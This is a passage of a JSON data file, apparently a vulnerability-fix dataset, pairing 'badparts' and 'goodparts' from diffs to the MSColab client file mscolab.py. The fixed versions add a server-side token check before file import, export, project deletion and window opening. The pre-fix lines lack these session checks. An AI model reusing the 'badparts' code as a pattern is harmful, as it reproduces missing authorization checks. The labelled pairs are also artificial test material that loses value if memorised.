icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int, int, str)\n     def handle_update_permission(self, p_id, u_id, access_level):\n","add":17,"remove":13,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        server_xml = self.request_wps_from_server()","        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)","        self.merge_dialog.saveBtn.setDisabled(True)","        if self.merge_dialog.exec_():","            xml_content = self.merge_dialog.get_values()","            if xml_content is not None:","                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                self.reload_view_windows()","                show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)","        self.merge_dialog = None"],"goodparts":["        if self.verify_user_token():","            server_xml = self.request_wps_from_server()","            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)","            self.merge_dialog.saveBtn.setDisabled(True)","            if self.merge_dialog.exec_():","                xml_content = self.merge_dialog.get_values()","                if xml_content is not None:","                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                    self.reload_view_windows()","                    show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)","            self.merge_dialog = None","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             if self.chat_window is not None:\n                 self.chat_window.load_users()\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int)\n     def handle_project_deleted(self, p_id)","add":2,"remove":1,"filename":"\/mslib\/msui\/mscolab.py","badparts":["            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.loginButton.setEnabled(self.emailid.text() != \"\" and self.password.text() != \"\")\n \n     def handle_import(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n-        else:\n-            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.import_plugins.keys()]\n-            file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        dir_path, file_name = fs.path.split(file_path)\n-        file_name = fs.path.basename(file_path)\n-        name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            with open_fs(dir_path) as file_dir:\n-                xml_content = file_dir.readtext(file_name)\n-            try:\n-                model = ft.WaypointsTableModel(xml_content=xml_content)\n-            except SyntaxError:\n-                show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n-                return\n-            self.waypoints_model = model\n+        if self.verify_user_token():\n             if self.workLocallyCheckBox.isChecked():\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n             else:\n+                file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\"\n+                                                         for ext in self.import_plugins.keys()]\n+                file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            dir_path, file_name = fs.path.split(file_path)\n+            file_name = fs.path.basename(file_path)\n+            name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                with open_fs(dir_path) as file_dir:\n+                    xml_content = file_dir.readtext(file_name)\n+                try:\n+                    model = ft.WaypointsTableModel(xml_content=xml_content)\n+                except SyntaxError:\n+                    show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n+                    return\n+                self.waypoints_model = model\n+                if self.workLocallyCheckBox.isChecked():\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                else:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            else:\n+                _function = self.import_plugins[file_ext[1:]]\n+                _, new_waypoints = _function(file_path)\n+                model = ft.WaypointsTableModel(waypoints=new_waypoints)\n+                self.waypoints_model = model\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n                 self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n                 self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            self.reload_view_windows()\n+            show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n         else:\n-            _function = self.import_plugins[file_ext[1:]]\n-            _, new_waypoints = _function(file_path)\n-            model = ft.WaypointsTableModel(waypoints=new_waypoints)\n-            self.waypoints_model = model\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n-            self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-        self.reload_view_windows()\n-        show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_export(self):\n-        # Setting default filename path for filedialogue\n-        default_filename = self.active_project_name + \".ftml\"\n-        file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n-        file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        file_name = fs.path.basename(file_path)\n-        file_name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            dir_path, file_name = fs.path.split(file_path)\n-            with open_fs(dir_path).open(file_name, 'w') as file:\n-                xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+        if self.verify_user_token():\n+            # Setting default filename path for filedialogue\n+            default_filename = self.active_project_name + \".ftml\"\n+            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n+            file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            file_name = fs.path.basename(file_path)\n+            file_name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                dir_path, file_name = fs.path.split(file_path)\n+                with open_fs(dir_path).open(file_name, 'w') as file:\n+                    xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+            else:\n+                _function = self.export_plugins[file_ext[1:]]\n+                _function(file_path, file_name, self.waypoints_model.waypoints)\n+                show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n         else:\n-            _function = self.export_plugins[file_ext[1:]]\n-            _function(file_path, file_name, self.waypoints_model.waypoints)\n-            show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def disable_project_buttons(self):\n         self.save_ft.setEnabled(False)\n","add":56,"remove":47,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.workLocallyCheckBox.isChecked():","            file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")","        else:","            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.import_plugins.keys()]","            file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))","        if file_path is None:","            return","        dir_path, file_name = fs.path.split(file_path)","        file_name = fs.path.basename(file_path)","        name, file_ext = fs.path.splitext(file_name)","        if file_ext[1:] == \"ftml\":","            with open_fs(dir_path) as file_dir:","                xml_content = file_dir.readtext(file_name)","            try:","                model = ft.WaypointsTableModel(xml_content=xml_content)","            except SyntaxError:","                show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")","                return","            self.waypoints_model = model","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","            _function = self.import_plugins[file_ext[1:]]","            _, new_waypoints = _function(file_path)","            model = ft.WaypointsTableModel(waypoints=new_waypoints)","            self.waypoints_model = model","            xml_doc = self.waypoints_model.get_xml_doc()","            xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")","            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","            self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","        self.reload_view_windows()","        show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)","        default_filename = self.active_project_name + \".ftml\"","        file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]","        file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))","        if file_path is None:","            return","        file_name = fs.path.basename(file_path)","        file_name, file_ext = fs.path.splitext(file_name)","        if file_ext[1:] == \"ftml\":","            xml_doc = self.waypoints_model.get_xml_doc()","            dir_path, file_name = fs.path.split(file_path)","            with open_fs(dir_path).open(file_name, 'w') as file:","                xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")","            _function = self.export_plugins[file_ext[1:]]","            _function(file_path, file_name, self.waypoints_model.waypoints)","            show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)"],"goodparts":["        if self.verify_user_token():","                file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")","                file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\"","                                                         for ext in self.import_plugins.keys()]","                file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))","            if file_path is None:","                return","            dir_path, file_name = fs.path.split(file_path)","            file_name = fs.path.basename(file_path)","            name, file_ext = fs.path.splitext(file_name)","            if file_ext[1:] == \"ftml\":","                with open_fs(dir_path) as file_dir:","                    xml_content = file_dir.readtext(file_name)","                try:","                    model = ft.WaypointsTableModel(xml_content=xml_content)","                except SyntaxError:","                    show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")","                    return","                self.waypoints_model = model","                if self.workLocallyCheckBox.isChecked():","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                else:","                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","            else:","                _function = self.import_plugins[file_ext[1:]]","                _, new_waypoints = _function(file_path)","                model = ft.WaypointsTableModel(waypoints=new_waypoints)","                self.waypoints_model = model","                xml_doc = self.waypoints_model.get_xml_doc()","                xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")","            self.reload_view_windows()","            show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            default_filename = self.active_project_name + \".ftml\"","            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]","            file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))","            if file_path is None:","                return","            file_name = fs.path.basename(file_path)","            file_name, file_ext = fs.path.splitext(file_name)","            if file_ext[1:] == \"ftml\":","                xml_doc = self.waypoints_model.get_xml_doc()","                dir_path, file_name = fs.path.split(file_path)","                with open_fs(dir_path).open(file_name, 'w') as file:","                    xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")","            else:","                _function = self.export_plugins[file_ext[1:]]","                _function(file_path, file_name, self.waypoints_model.waypoints)","                show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             return\n         else:\n             logging.debug(self.token)\n-        self.proj_diag = QtWidgets.QDialog()\n-        self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n-        self.add_proj_dialog.setupUi(self.proj_diag)\n-        self.add_proj_dialog.f_content = None\n-        self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n-        self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n-        self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n-        self.proj_diag.show()\n+        if self.verify_user_token():\n+            self.proj_diag = QtWidgets.QDialog()\n+            self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n+            self.add_proj_dialog.setupUi(self.proj_diag)\n+            self.add_proj_dialog.f_content = None\n+            self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n+            self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n+            self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n+            self.proj_diag.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def check_and_enable_project_accept(self):\n         if self.add_proj_dialog.path.text() != \"\" and self.add_proj_dialog.description.toPlainText() != \"\":\n","add":14,"remove":10,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        self.proj_diag = QtWidgets.QDialog()","        self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()","        self.add_proj_dialog.setupUi(self.proj_diag)","        self.add_proj_dialog.f_content = None","        self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)","        self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)","        self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)","        self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)","        self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)","        self.proj_diag.show()"],"goodparts":["        if self.verify_user_token():","            self.proj_diag = QtWidgets.QDialog()","            self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()","            self.add_proj_dialog.setupUi(self.proj_diag)","            self.add_proj_dialog.f_content = None","            self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)","            self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)","            self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)","            self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)","            self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)","            self.proj_diag.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             self.help_dialog.show()\n \n     def handle_delete_project(self):\n-        entered_project_name, ok = QtWidgets.QInputDialog.getText(\n-            self,\n-            self.tr('Delete Project'),\n-            self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n-                    f\"Enter the project name to confirm: \"))\n-        if ok:\n-            if entered_project_name == self.active_project_name:\n-                data = {\n-                    \"token\": self.token,\n-                    \"p_id\": self.active_pid\n-                }\n-                url = url_join(self.mscolab_server_url, 'delete_project')\n-                try:\n-                    res = requests.post(url, data=data)\n-                    res.raise_for_status()\n-                except requests.exceptions.RequestException as e:\n-                    logging.debug(e)\n-                    show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n-            else:\n-                show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        if self.verify_user_token():\n+            entered_project_name, ok = QtWidgets.QInputDialog.getText(\n+                self,\n+                self.tr('Delete Project'),\n+                self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n+                        f\"Enter the project name to confirm: \"))\n+            if ok:\n+                if entered_project_name == self.active_project_name:\n+                    data = {\n+                        \"token\": self.token,\n+                        \"p_id\": self.active_pid\n+                    }\n+                    url = url_join(self.mscolab_server_url, 'delete_project')\n+                    try:\n+                        res = requests.post(url, data=data)\n+                        res.raise_for_status()\n+                    except requests.exceptions.RequestException as e:\n+                        logging.debug(e)\n+                        show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n+                else:\n+                    show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_chat_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.chat_window is not None:\n-            self.chat_window.raise_()\n-            self.chat_window.activateWindow()\n-            return\n+            if self.chat_window is not None:\n+                self.chat_window.raise_()\n+                self.chat_window.activateWindow()\n+                return\n \n-        self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n-                                                   self.access_level, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.chat_window.viewCloses.connect(self.close_chat_window)\n-        self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.chat_window.show()\n+            self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n+                                                       self.access_level, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.chat_window.viewCloses.connect(self.close_chat_window)\n+            self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.chat_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_chat_window(self):\n         self.raise_()\n         self.chat_window = None\n \n     def open_admin_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.admin_window is not None:\n-            self.admin_window.raise_()\n-            self.admin_window.activateWindow()\n-            return\n+            if self.admin_window is not None:\n+                self.admin_window.raise_()\n+                self.admin_window.activateWindow()\n+                return\n \n-        self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n-                                                   self.active_project_name, self.projects, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.admin_window.viewCloses.connect(self.close_admin_window)\n-        self.admin_window.show()\n+            self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n+                                                       self.active_project_name, self.projects, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.admin_window.viewCloses.connect(self.close_admin_window)\n+            self.admin_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_admin_window(self):\n         self.raise_()\n         self.admin_window = None\n \n     def open_version_history_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.version_window is not None:\n-            self.version_window.raise_()\n-            self.version_window.activateWindow()\n-            return\n+            if self.version_window is not None:\n+                self.version_window.raise_()\n+                self.version_window.activateWindow()\n+                return\n \n-        self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n-                                                        self.active_project_name, self.conn,\n-                                                        mscolab_server_url=self.mscolab_server_url)\n-        self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.version_window.viewCloses.connect(self.close_version_history_window)\n-        self.version_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.version_window.show()\n+            self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n+                                                            self.active_project_name, self.conn,\n+                                                            mscolab_server_url=self.mscolab_server_url)\n+            self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.version_window.viewCloses.connect(self.close_version_history_window)\n+            self.version_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.version_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_version_history_window(self):\n         self.raise_()\n","add":74,"remove":58,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        entered_project_name, ok = QtWidgets.QInputDialog.getText(","            self,","            self.tr('Delete Project'),","            self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"","                    f\"Enter the project name to confirm: \"))","        if ok:","            if entered_project_name == self.active_project_name:","                data = {","                    \"token\": self.token,","                    \"p_id\": self.active_pid","                }","                url = url_join(self.mscolab_server_url, 'delete_project')","                try:","                    res = requests.post(url, data=data)","                    res.raise_for_status()","                except requests.exceptions.RequestException as e:","                    logging.debug(e)","                    show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")","            else:","                show_popup(self, \"Error\", \"Entered project name did not match!\")","        if self.active_pid is None:","            return","        if self.chat_window is not None:","            self.chat_window.raise_()","            self.chat_window.activateWindow()","            return","        self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,","                                                   self.access_level, self.conn,","                                                   mscolab_server_url=self.mscolab_server_url)","        self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.chat_window.viewCloses.connect(self.close_chat_window)","        self.chat_window.reloadWindows.connect(self.reload_windows_slot)","        self.chat_window.show()","        if self.active_pid is None:","            return","        if self.admin_window is not None:","            self.admin_window.raise_()","            self.admin_window.activateWindow()","            return","        self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,","                                                   self.active_project_name, self.projects, self.conn,","                                                   mscolab_server_url=self.mscolab_server_url)","        self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.admin_window.viewCloses.connect(self.close_admin_window)","        self.admin_window.show()","        if self.active_pid is None:","            return","        if self.version_window is not None:","            self.version_window.raise_()","            self.version_window.activateWindow()","            return","        self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,","                                                        self.active_project_name, self.conn,","                                                        mscolab_server_url=self.mscolab_server_url)","        self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.version_window.viewCloses.connect(self.close_version_history_window)","        self.version_window.reloadWindows.connect(self.reload_windows_slot)","        self.version_window.show()"],"goodparts":["        if self.verify_user_token():","            entered_project_name, ok = QtWidgets.QInputDialog.getText(","                self,","                self.tr('Delete Project'),","                self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"","                        f\"Enter the project name to confirm: \"))","            if ok:","                if entered_project_name == self.active_project_name:","                    data = {","                        \"token\": self.token,","                        \"p_id\": self.active_pid","                    }","                    url = url_join(self.mscolab_server_url, 'delete_project')","                    try:","                        res = requests.post(url, data=data)","                        res.raise_for_status()","                    except requests.exceptions.RequestException as e:","                        logging.debug(e)","                        show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")","                else:","                    show_popup(self, \"Error\", \"Entered project name did not match!\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.chat_window is not None:","                self.chat_window.raise_()","                self.chat_window.activateWindow()","                return","            self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,","                                                       self.access_level, self.conn,","                                                       mscolab_server_url=self.mscolab_server_url)","            self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.chat_window.viewCloses.connect(self.close_chat_window)","            self.chat_window.reloadWindows.connect(self.reload_windows_slot)","            self.chat_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.admin_window is not None:","                self.admin_window.raise_()","                self.admin_window.activateWindow()","                return","            self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,","                                                       self.active_project_name, self.projects, self.conn,","                                                       mscolab_server_url=self.mscolab_server_url)","            self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.admin_window.viewCloses.connect(self.close_admin_window)","            self.admin_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.version_window is not None:","                self.version_window.raise_()","                self.version_window.activateWindow()","                return","            self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,","                                                            self.active_project_name, self.conn,","                                                            mscolab_server_url=self.mscolab_server_url)","            self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.version_window.viewCloses.connect(self.close_version_history_window)","            self.version_window.reloadWindows.connect(self.reload_windows_slot)","            self.version_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             mss_dir.writetext(rel_file_path, server_data)\n \n     def handle_work_locally_toggle(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            if self.version_window is not None:\n-                self.version_window.close()\n-            self.create_local_project_file()\n-            self.local_ftml_file = fs.path.combine(self.data_dir,\n-                                                   fs.path.join('local_mscolab_data',\n-                                                                self.user['username'], self.active_project_name,\n-                                                                'mscolab_project.ftml'))\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Local File. Your changes are only available to you.\"\n-                        \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n-            self.save_ft.setEnabled(True)\n-            self.fetch_ft.setEnabled(True)\n-            self.versionHistoryBtn.setEnabled(False)\n-            self.reload_local_wp()\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                if self.version_window is not None:\n+                    self.version_window.close()\n+                self.create_local_project_file()\n+                self.local_ftml_file = fs.path.combine(self.data_dir,\n+                                                       fs.path.join('local_mscolab_data',\n+                                                                    self.user['username'], self.active_project_name,\n+                                                                    'mscolab_project.ftml'))\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Local File. Your changes are only available to you.\"\n+                            \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n+                self.save_ft.setEnabled(True)\n+                self.fetch_ft.setEnabled(True)\n+                self.versionHistoryBtn.setEnabled(False)\n+                self.reload_local_wp()\n \n+            else:\n+                self.local_ftml_file = None\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n+                            \"Turn on work locally to work on local flight track file\"))\n+                self.save_ft.setEnabled(False)\n+                self.fetch_ft.setEnabled(False)\n+                if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n+                    self.versionHistoryBtn.setEnabled(True)\n+                self.waypoints_model = None\n+                self.load_wps_from_server()\n+            self.reload_view_windows()\n         else:\n-            self.local_ftml_file = None\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                        \"Turn on work locally to work on local flight track file\"))\n-            self.save_ft.setEnabled(False)\n-            self.fetch_ft.setEnabled(False)\n-            if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n-                self.versionHistoryBtn.setEnabled(True)\n-            self.waypoints_model = None\n-            self.load_wps_from_server()\n-        self.reload_view_windows()\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n+\n+    def verify_user_token(self):\n+        data = {\n+            \"token\": self.token\n+        }\n+        try:\n+            r = requests.get(f'{self.mscolab_server_url}\/test_authorized', data=data)\n+        except requests.exceptions.ConnectionError as ex:\n+            logging.error(\"unexpected error: %s %s\", type(ex), ex)\n+            return False\n+        return r.text == \"True\"\n \n     def authorize(self):\n         for key, value in config_loader(dataset=\"MSC_login\").items():\n","add":41,"remove":26,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.workLocallyCheckBox.isChecked():","            if self.version_window is not None:","                self.version_window.close()","            self.create_local_project_file()","            self.local_ftml_file = fs.path.combine(self.data_dir,","                                                   fs.path.join('local_mscolab_data',","                                                                self.user['username'], self.active_project_name,","                                                                'mscolab_project.ftml'))","            self.helperTextLabel.setText(","                self.tr(\"Working On: Local File. Your changes are only available to you.\"","                        \"To save your changes with everyone, use the 